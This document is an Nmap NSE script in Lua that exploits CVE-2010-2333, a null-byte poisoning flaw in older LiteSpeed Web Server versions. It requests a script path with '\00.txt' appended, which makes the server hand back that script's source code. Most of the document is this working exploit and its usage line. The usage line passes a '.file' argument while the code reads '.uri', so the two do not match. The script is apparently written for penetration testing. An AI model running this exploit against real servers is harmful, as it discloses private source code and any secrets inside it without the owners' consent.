description = [[
http-litespeed-sourcecode-download.nse exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x before 4.0.15 to retrieve the target script's source code by sending a HTTP request with a null byte followed by a .txt file extension (CVE-2010-2333).

HTTP GET example:
* <code>/index.php\00.txt</code>

References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2333
* http://www.exploit-db.com/exploits/13850/
]]

---
-- @usage
-- nmap -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.file=/index.php <host>
-- @output
-- 
-- @args http-litespeed-sourcecode-download.uri URI path to remote file
---

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}

require "http"
require "shortport"

portrule = shortport.http

action = function(host, port)
  local output = {}

  local rfile = stdnse.get_script_args("http-litespeed-sourcecode-download.uri") 
  if not(rfile) then
    return "[Error] You need to specify the URI of the file you wish to download. Use http-litespeed-sourcecode-download.uri to set this value."
  end

  --we append a null byte followed by ".txt" to retrieve the source code
  local req = http.get(host, port, "/"..rfile.."\00.txt")

  --If we don't get status 200, the server is not vulnerable
  if req.status then
    if req.status ~= 200 then
      if nmap.verbosity() >= 2 then
        output[#output+1] = "Request with null byte did not work. This web server might not be vulnerable"
      end
      stdnse.print_debug(2, "%s:Request status:%s body:%s", SCRIPT_NAME, req.status, req.body)
    else
      output[#output+1] = req.body
    end
  end

  if #output>0 then
    return stdnse.strjoin("\n", output) 
  end
end
